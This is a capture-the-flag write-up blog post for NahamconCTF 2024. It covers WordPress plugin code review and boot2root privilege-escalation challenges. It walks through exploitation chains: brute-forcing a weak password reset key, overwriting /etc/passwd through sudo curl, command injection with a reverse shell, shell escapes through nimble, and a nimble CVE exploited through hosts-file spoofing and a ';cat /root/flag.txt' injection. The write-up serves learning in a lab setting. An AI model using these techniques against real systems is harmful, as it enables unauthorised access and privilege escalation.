@@ -1,0 +1,607 @@
+---
+title: NahamconCTF 2024 Writeups
+date: '2024-05-25'
+tags: ['livectfs', 'writeups', 'privesc']
+draft: false
+summary: Writeups for some of the good challenges that I solved
+---
+
+# Summary and Thoughts
+The past 2 days I competed in NahamconCTF 24 with [b01lers](https://b01lers.com/). We ranked 16 out of more than 3800 teams (We could have got lower 1x if I didn't choke on that Integrity Mission).
+There were a lot of challenges, ranging from warmups to hard. Out of a dozen of challenges I solved, I just want to share the solves for some interesting ones where I enjoyed solving. 
+
+This writeup blog is focus on the boot2root challenges and the wordpress ones. I managed to clear all the boot2root, all the machine learning (they're a bit troll) and 2 out of 3 Patchstack's Wordpress Plugin Code Review ones.
+I haven't read and written PHP code much add all, so it was a harder for me but still fun. The boot2root ones involved lesser known or very new stuff, which is always better than GTFObin boxes.
+
+# Patchstack's PHP WordPress challenges
+## Secret Info (Medium, 460 points, 92 solves)
+
+### Description
+Our admin accidentally published some secret images on our site. Unfortunately, somehow we are not able to unpublish the secret image, however, we tried to apply some protection to our site. This should be enough, right?
+
+This is a fully white box challenge, almost no heavy brute force is needed.
+
+### Code review
+We're given a zip of files to build a wordpress site with one custom plugin **test-plugin.php**. The code for the plugin is trivial:
+```
+<?php
+
+/**
+ *
+ * @wordpress-plugin
+ * Plugin Name:       Test Plugin
+ * Plugin URI:        http://example.com/plugin-name-uri/
+ * Description:       This is a short description of what the plugin does. It's displayed in the WordPress admin area.
+ * Version:           1.0.0
+ * Author:            Patchstack
+ * Author URI:        http://example.com/
+ * License:           GPL-2.0+
+ * License URI:       http://www.gnu.org/licenses/gpl-2.0.txt
+ * Text Domain:       test-plugin
+ * Domain Path:       /languages
+ */
+
+// If this file is called directly, abort.
+if ( ! defined( 'WPINC' ) ) {
+	die;
+}
+
+define( 'PLUGIN_NAME_PLUGIN_NAME', 'test-plugin' );
+define( 'PLUGIN_NAME_VERSION', '1.0.0' );
+define( 'PLUGIN_NAME_URL', plugin_dir_url( __FILE__ ) );
+define( 'PLUGIN_NAME_PATH', plugin_dir_path( __FILE__ ) );
+define( 'PLUGIN_NAME_BASE_DIR', plugin_dir_path( __FILE__ ) );
+define( 'PLUGIN_NAME_BASE_NAME', plugin_basename( __FILE__ ) );
+
+add_action("wp_ajax_nopriv_register_user", "register_user");
+
+function register_user(){
+    $username = sanitize_text_field($_POST["username"]);
+    $password = sanitize_text_field($_POST["password"]);
+    $email = sanitize_text_field($_POST["email"]);
+
+    wp_create_user($username, $password, $email);
+    echo "user created";
+}
+```
+
+The plugin registered an AJAX action "register_user". "wp_ajax_nopriv" means that unauthenticated users can access the endpoint. If we POST to **/wp-admin/admin-ajax.php?action=register_user** with the form data, we can register a user and login. While this endpoint will prove useful for other challenges, it's just troll stuff for this challenge.
+
+
+Let's take a look at **.htaccess**:
+```
+# BEGIN WordPress
+# The directives (lines) between "BEGIN WordPress" and "END WordPress" are
+# dynamically generated, and should only be modified via WordPress filters.
+# Any changes to the directives between these markers will be overwritten.
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+RewriteRule ^wp-admin/edit.php$ - [F]
+RewriteRule ^wp-admin/post-new.php$ - [F]
+RewriteRule ^wp-admin/post.php$ - [F]
+RewriteRule ^wp-admin/edit-comments.php$ - [F]
+
+</IfModule>
+```
+Some basic rewrites and most /wp-admin endpoints are blocked. For more information you can check the mod_rewrite syntaxes or consult ChatGPT.
+
+
+Let's look for how we can get the flag. First, the flag is a PNG. In the Makefile we got this interesting line:
+```
+$(WP_CLI) media import /flag_secret_not_so_random_get_me_1337.png
+```
+
+So the flag is part of WordPress's media. Consulting the API documentation, I went to this endpoint: 
+```
+/wp-json/wp/v2/media?search=flag
+```
+
+And got 
+```
+[
+    {
+        "id": 4,
+        "date": "2024-05-25T20:04:54",
+        "date_gmt": "2024-05-25T20:04:54",
+        "guid": {
+            "rendered": "http://challenge.nahamcon.com:31515/wp-content/uploads/2024/05/flag_secret_not_so_random_get_me_1337.png"
+        },
+    MORE STUFF DOWN HERE
+```
+Going to that rendered URL gives me the flag.
+
+## WP Elevator (Hard, 494 Points, 37 solves)
+
+### Description
+Asked my freelance developer friend to write me an authorization plugin so I can share knowledge with selected memebers. He is still working on it but gave me an early version. I don't know how it works but will talk with him once he finishes.
+
+### Code Review
+Looks like this is an instance of "reinvent the wheel and make it square". Similar settings to the previous challenge, except this time we got a more sophisticated plugin named "p-member-manager.php". 
+For this challenge everything needed to solve is in the source file for the plugin, so let's dissect it carefully:
+
+First, we can register users via this API:
+```
+add_action("rest_api_init", "register_user_creation_endpoint");
+
+function register_user_creation_endpoint()
+{
+    register_rest_route("user/v1", "/create", [
+        "methods" => "POST",
+        "callback" => "create_user_via_api",
+        "permission_callback" => "__return_true", // Allow anyone to access this endpoint
+    ]);
+}
+
+function create_user_via_api($request)
+{
+    $parameters = $request->get_json_params();
+
+    $username = sanitize_text_field($parameters["username"]);
+    $email = sanitize_email($parameters["email"]);
+    $password = wp_generate_password();
+
+    // Create user
+    $user_id = wp_create_user($username, $password, $email);
+
+    if (is_wp_error($user_id)) {
+        return new WP_Error(
+            "user_creation_failed",
+            __("User creation failed.", "text_domain"),
+            ["status" => 500]
+        );
+    }
+
+    // Add user role
+    $user = new WP_User($user_id);
+    $user->set_role("subscriber");
+
+    return [
+        "message" => __("User created successfully.", "text_domain"),
+        "user_id" => $user_id,
+    ];
+}
+```
+Pretty standard stuff. You get the **subscriber** role. Note that an admin user is created by default with id=1, so everybody takes id 2, 3, 4 so on. Also, we don't know the password to our user because it's randomly generated. If you want to bruteforce it, it's like 12 characters long with some special characters (We'll dissect wp_generate_password shortly after)
+
+Funny enough, they gave you an AJAX endpoint to get the flag:
+```
+add_action("wp_ajax_patchstack_flagger", "flagger_request_callback");
+
+function flagger_request_callback()
+{
+    // Validate nonce
+    $nonce = isset($_REQUEST["nonce"])
+        ? sanitize_text_field($_REQUEST["nonce"])
+        : "";
+    if (!wp_verify_nonce($nonce, "get_latest_posts_nonce")) {
+        wp_send_json_error("Invalid nonce.");
+        return;
+    }
+    $user = wp_get_current_user();
+    $allowed_roles = ["administrator", "subscriber"];
+    if (array_intersect($allowed_roles, $user->roles)) {
+        $value = file_get_contents('/flag.txt');
+        wp_send_json_success(["value" => $value]);
+    } else {
+        wp_send_json_error("Missing permission.");
+    }
+}
+```
+
+To sum up, we need  **patchstack_flagger** with the correct **nonce** to get the flag. So essentially need to figure out a way to login with this random password thing, and somehow get the nonce.
+
+I was thinking it's a 2-part challenge, but they even give you a bad nonce generating function:
+```
+add_action("wp_ajax_get_latest_posts", "get_latest_posts_callback");
+
+function get_latest_posts_callback()
+{
+    // Check if the current user has the subscriber role
+    if (!current_user_can("subscriber")) {
+        wp_send_json_error("Unauthorized access.");
+        return;
+    }
+
+    // Generate nonce
+    $nonce = wp_create_nonce("get_latest_posts_nonce");
+
+    // Get latest 5 posts
+    $args = [
+        "posts_per_page" => 5,
+        "post_status" => "publish",
+        "orderby" => "date",
+        "order" => "DESC",
+    ];
+
+    $latest_posts = get_posts($args);
+
+    // Prepare posts data
+    $posts_data = [];
+    foreach ($latest_posts as $post) {
+        $posts_data[] = [
+            "title" => $post->post_title,
+            "content" => $post->post_content,
+            "link" => get_permalink($post),
+        ];
+    }
+
+    // Send response with nonce and posts data
+    wp_send_json_success(["nonce" => $nonce, "posts" => $posts_data]);
+}
+```
+
+The nonce is generated by wp_create_nonce("get_latest_posts_nonce"). Looks pretty secure right? Uh oh, let's look at the source code for [wp_create_nonce](https://developer.wordpress.org/reference/functions/wp_create_nonce/)
+```
+function wp_create_nonce( $action = -1 ) {
+	$user = wp_get_current_user();
+	$uid  = (int) $user->ID;
+	if ( ! $uid ) {
+		/** This filter is documented in wp-includes/pluggable.php */
+		$uid = apply_filters( 'nonce_user_logged_out', $uid, $action );
+	}
+
+	$token = wp_get_session_token();
+	$i     = wp_nonce_tick( $action );
+
+	return substr( wp_hash( $i . '|' . $action . '|' . $uid . '|' . $token, 'nonce' ), -12, 10 );
+}
+```
+
+What a bum. The variables are $uid, $token and $i. We know the first 2 stays in a short time span. Let's look at [wp_nonce_tick](https://developer.wordpress.org/reference/functions/wp_nonce_tick/):
+```
+function wp_nonce_tick( $action = -1 ) {
+	/**
+	 * Filters the lifespan of nonces in seconds.
+	 *
+	 * @since 2.5.0
+	 * @since 6.1.0 Added `$action` argument to allow for more targeted filters.
+	 *
+	 * @param int        $lifespan Lifespan of nonces in seconds. Default 86,400 seconds, or one day.
+	 * @param string|int $action   The nonce action, or -1 if none was provided.
+	 */
+	$nonce_life = apply_filters( 'nonce_life', DAY_IN_SECONDS, $action );
+
+	return ceil( time() / ( $nonce_life / 2 ) );
+}
+```
+The lifetime of our nonce is a day so, easy peasy. Jokes aside, if we get the password to login after creating the user we're good.
+
+The plugin provides this interesting functionality for getting the password reset key:
+```
+function get_password_reset_key2($user)
+{
+    global $wp_hasher;
+
+    if (!($user instanceof WP_User)) {
+        return new WP_Error(
+            "invalidcombo",
+            __(
+                "<strong>Error:</strong> There is no account with that username or email address."
+            )
+        );
+    }
+
+    /**
+     * Fires before a new password is retrieved.
+     *
+     * Use the 'retrieve_password' hook instead.
+     *
+     * @since 1.5.0
+     * @deprecated 1.5.1 Misspelled. Use 'retrieve_password' hook instead.
+     *
+     * @param string $user_login The user login name.
+     */
+    do_action_deprecated(
+        "retreive_password",
+        [$user->user_login],
+        "1.5.1",
+        "retrieve_password"
+    );
+
+    /**
+     * Fires before a new password is retrieved.
+     *
+     * @since 1.5.1
+     *
+     * @param string $user_login The user login name.
+     */
+    do_action("retrieve_password", $user->user_login);
+
+    $password_reset_allowed = wp_is_password_reset_allowed_for_user($user);
+    if (!$password_reset_allowed) {
+        return new WP_Error(
+            "no_password_reset",
+            __("Password reset is not allowed for this user")
+        );
+    } elseif (is_wp_error($password_reset_allowed)) {
+        return $password_reset_allowed;
+    }
+
+    // Generate something random for a password reset key.
+    $key = wp_generate_password(1, false);
+    /**
+     * Fires when a password reset key is generated.
+     *
+     * @since 2.5.0
+     *
+     * @param string $user_login The username for the user.
+     * @param string $key        The generated password reset key.
+     */
+    do_action("retrieve_password_key", $user->user_login, $key);
+
+    // Now insert the key, hashed, into the DB.
+    if (empty($wp_hasher)) {
+        require_once ABSPATH . WPINC . "/class-phpass.php";
+        $wp_hasher = new PasswordHash(8, true);
+    }
+
+    $hashed = time() . ":" . $wp_hasher->HashPassword($key);
+
+    $key_saved = wp_update_user([
+        "ID" => $user->ID,
+        "user_activation_key" => $hashed,
+    ]);
+
+    if (is_wp_error($key_saved)) {
+        return $key_saved;
+    }
+
+    return $key;
+}
+
+add_action("wp_ajax_reset_key", "reset_password_key_callback");
+add_action("wp_ajax_nopriv_reset_key", "reset_password_key_callback");
+
+function reset_password_key_callback()
+{
+    $user_id = isset($_POST["user_id"]) ? intval($_POST["user_id"]) : 0;
+    $user = new WP_User($user_id);
+    if ($user_id > 1) {
+        if (
+            !empty($user->roles) &&
+            is_array($user->roles) &&
+            in_array("subscriber", $user->roles)
+        ) {
+            $updated = get_password_reset_key2($user);
+            if (is_wp_error($updated)) {
+                wp_send_json_error("Failed to reset password key.");
+            } else {
+                wp_send_json_success([
+                    "message" => "Password reset key reset successfully.",
+                ]);
+            }
+        } else {
+            wp_send_json_error("User is not a subscriber.");
+        }
+    } else {
+        wp_send_json_error("Invalid user ID.");
+    }
+}
+```
+See that we don't need to be authenticated to reset password with that **no_priv** action. We need to provide the user_id and that's it. Diff it with the real password reset key function we see that 
+```
+// For the real:
+// Generate something random for a password reset key.
+	$key = wp_generate_password( 20, false );
+
+// The square wheel:
+// Generate something random for a password reset key.
+    $key = wp_generate_password(1, false);
+```
+
+What a secure square wheel reinvented. We just need to look for the structure of the reset key link. We can take a look at this line from [retrieve_password()](https://developer.wordpress.org/reference/functions/retrieve_password/):
+```
+	$message .= network_site_url( "wp-login.php?action=rp&key=$key&login=" . rawurlencode( $user_login ), 'login' ) . '&wp_lang=' . $locale . "\r\n\r\n";
+```
+
+With all that said, here's how to get the flag from start to finish:
+- Send a request with JSON data to **/wp-json/user/v1/create** to create our user with id=2
+- Send a POST request to **/wp-admin/admin-ajax.php?action=reset_key** with formdate **user_id=2** to trigger the vulnerable reset key generation function
+- Brute force the single character key at **/wp-login.php?action=rp&key=[KEY]&login=[USERNAME]&locale=en_US**
+- Change the password, login to get a valid dev-token
+- Trigger the AJAX call **/wp-admin/admin-ajax.php?action=get_latest_posts** to get the nonce
+- Use the nonce at **/wp-admin/admin-ajax.php?action=patchstack_flagger&nonce=[NONCE_HERE]** to get the flag
+
+# Boot2Root & Privilege Escalation challenges
+## Curly Fries (Medium, 358 points, 171 solves)
+Quickly checking the basics:
+```bash session
+user@curlyfries:~$ sudo -l
+User user may run the following commands on curly-fries-a0a98763070583f6-7945fb64f8-lq2lc:
+    (fry) NOPASSWD: /usr/bin/curl 127.0.0.1\:8000/health-check
+```
+
+Well then, if you haven't realized yet, this basically allows us to do privilege write to any files. We will setup a file name **health-check** in the current directory, copy **/etc/passwd** in, with the **x** mark of root removed like this
+```bash
+# Before
+root:x:0:0:root:/root:/bin/ash
+# After
+root::0:0:root:/root:/bin/ash
+```
+Then we **su root** and run the **get_flag** function to win.
+
+## Secure Surfer (Medium, 371 points, 163 solves):
+We're given this C program:
+```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void surf(const char *url) {
+    char command[512];
+    sprintf(command, "/usr/local/bin/lynx --accept_all_cookies -cache=0 -restrictions=all '%s'", url);
+    system(command);
+    system("stty sane");
+}
+
+int main() {
+    puts("  _____                           _____             __          ");
+    puts(" / ____|                         / ____|           / _|         ");
+    puts("| (___   ___  ___ _   _ _ __ ___| (___  _   _ _ __| |_ ___ _ __ ");
+    puts(" \\___ \\ / _ \\/ __| | | | '__/ _ \\\\___ \\| | | | '__|  _/ _ \\ '__|");
+    puts(" ____) |  __/ (__| |_| | | |  __/____) | |_| | |  | ||  __/ |   ");
+    puts("|_____/ \\___|\\___|\\__,_|_|  \\___|_____/ \\__,_|_|  |_| \\___|_|   ");
+    puts("");
+
+    int choice;
+
+    while (1) {
+        printf("\n===== Menu =====\n");
+        printf("  1. Surf SSH\n");
+        printf("  2. Surf RSA\n");
+        printf("  3. Surf DSA\n");
+        printf("  4. Surf ECDSA\n");
+        printf("  5. Surf ECDH\n");
+        printf("  6. Surf WWW\n");
+        printf("  7. Exit\n");
+        puts("");
+        printf("Enter your choice: ");
+        fflush(stdout); 
+        scanf("%d", &choice);
+        getchar(); 
+
+        switch (choice) {
+            case 1:
+                surf("https://en.wikipedia.org/wiki/Secure_Shell");
+                break;
+            case 2:
+                surf("https://en.wikipedia.org/wiki/RSA_(cryptosystem)");
+                break;
+            case 3:
+                surf("https://en.wikipedia.org/wiki/Digital_Signature_Algorithm");
+                break;
+            case 4:
+                surf("https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm");
+                break;
+            case 5:
+                surf("https://en.wikipedia.org/wiki/Elliptic-curve_Diffie%E2%80%93Hellman");
+                break;
+            case 6:
+                {
+                    char url[1024];
+                    printf("Online URL: ");
+                    fflush(stdout); 
+                    fgets(url, sizeof(url), stdin);
+                    url[strcspn(url, "\n")] = 0; // Remove newline character
+
+                    if (strstr(url, "https://") == NULL) {
+                        printf("\nWe    are secure here at the SecureSurfer! You must use https:// !\n");
+                    } else {
+                        surf(url);
+                    }
+                }
+                break;
+            case 7:
+                printf("Exiting SecureSurfer...\n");
+                return 0;
+                break;
+            default:
+                printf("Invalid choice. Please try again.\n");
+                break;
+        }
+    }
+
+    return 0;
+}
+```
+Well the only thing we care about is:
+
+```C
+sprintf(command, "/usr/local/bin/lynx --accept_all_cookies -cache=0 -restrictions=all '%s'", url);
+```
+
+Easy command injection aye!
+I'm a bit lazy so here's the rest:
+- Use the single quote to close the URL quote, inject your reverse shell commands, add something to close the backtick nicely. Remember that the payload needs to contain "https://"
+
+For PE, you can run the "lynx" binary with sudo privilege. Well, if you read the man page, you'll find many ways to pop a shell. It's not GTFOBin lame, but still lame lame somehow.
+
+## Jack Be (Medium, 465 points, 86 solves)
+
+This is an enjoyable one for me personally. The setting is that this user Jack is trying to learn the [Nim Programming Language](). He has made some changes that resulted in the system being vulnerable to PE. Let's deep dive into this one
+
+First, we get to login as the user **user**. On the system there are also **jack** and **root** of course. Running [linpeas]() on this guy doesn't get anything. **sudo -l** tells us that we can run **nimble run** as **jack**.
+
+Nimble is a package manager for Nim. Feels a lot like *npm*. More on nimble [here](https://github.com/nim-lang/nimble).
+Pretty straightforward here, we just need to **nimble run** a program as **jack** which pops a shell for us. At first, I was being lazy and try to let ChatGPT cook. Unfortunately, bro decided to be dumb and spit out some garbages that compiled but froze. Then I resorted to actually learning Nim a bit.
+After a few minutes reading, I figured it out the way:
+- On /home/user, run **nimble init** and fill out some junks to initialize a project.
+- Write this into the main file:
+```nim
+import std/os
+discard execShellCmd("bash -p")
+```
+- Then change permission of /home/user to 777 to make sure jack can run this smoothly
+Feel free to investigate Nim in any way you like, I was in no mood learning a new language, so I just quickly got Jack's bash shell:
+```bash
+sudo -u jack nimble run
+```
+Step 1 done!
+
+Here's the PE vector for Jack:
+```bash
+jack@jackbe:~$ sudo -l
+User jack may run the following commands on jack-be-c896b8c565c3bf42-565f954c57-42pj2:
+    (root) NOPASSWD: /usr/bin/nimble install *
+```
+
+At first I was looking at the documentation for nimble install to see if there's something like arbitrary read write. A note here is that the challenge doesn't need you to pop a root shell, just need to read /root/flag.txt. That's why I was looking for some file leak vector.
+After not seeing anything too interesting straight-up, I went on a vulnerability research. 
+
+Turns out this box is about this CVE-2021-2137x series. There is this great [writeup](https://consensys.io/diligence/vulnerabilities/nim-insecure-ssl-tls-defaults-remote-code-execution/) about it, but here's the summary:
+- Information about packages is in this packages.json file, hosted on multiple domains including, **github.com**, **nim-lang.org**. It checks github first. The nim-lang on is http only, no secure.
+- When doing **nimble install**, this package file will be fetched if not presented locally, or from what I've seen it fetches all the time. 
+- In this vulnerable version of **nimble**, the fetch URL doesn't need to be HTTPS. (Spoofing spoofing whoohoo).
+- The git cloning action of nimble is actually vulnerable to command injection, semicolon literally works. 
+
+We also have the box having /etc/hosts fully writable by Jack. 
+
+So here's our exploit chain:
+- Create a directory structure mimicking the URL for the nim-lang URL and create a fake **packages.json** that includes Command Injection.
+- Modify /etc/hosts to point both **github.com** and **nim-lang.org** to localhost.
+- Serve the fake nim-lang file structure using Python's HTTP server on port 80 and make sure nothing is on port 443
+- Thus, when we try **nimble install** with sudo, it will first check our 443, get denied instantly, goes to our spoofed nim-lang, downloads the fake file, trigger the command injection.
+
+Here's the result:
+```
+jack@jackbe:~$ jack@jackbe:~$ sudo nimble install lmao
+    Prompt: fuck not found in any local packages.json, check internet for updated packages? [y/N]
+y
+    Answer: Downloading Official package list
+127.0.0.1 - - [24/May/2024 05:15:21] "GET /nimble/packages.json HTTP/1.1" 200 -
+    Success Package list downloaded.
+       Tip: 7 messages have been suppressed, use --verbose to show them.
+     Error: Package not found.
+jack@jackbe:~$ sudo nimble install fuck
+Downloading https://google.com/;cat /root/flag.txt using git
+       Tip: 1 messages have been suppressed, use --verbose to show them.
+     Error: Execution failed with exit code 1
+        ... Command: git clone --recursive --depth 1 https://google.com/;cat /root/flag.txt /tmp/nimble_258/googlecom_catrootflagtxt
+        ... Output: Cloning into 'google.com'...
+        ... fatal: repository 'https://google.com/' not found
+        ... flag{7e8aee8e33745a52a535fdd839776ada}
+        ... cat: can't open '/tmp/nimble_258/googlecom_catrootflagtxt': No such file or directory
+jack@jackbe:~$ Connection to challenge.nahamcon.com closed by remote host.
+Connection to challenge.nahamcon.com closed.
+```
+
+Although the CVE is like 3 years old, I still got to practice cool techniques and learned new stuff. 
+
+
+# End of this ulong64 post, keep on grinding and hacking!
+
+
+
+
+
+
+
+
+
+
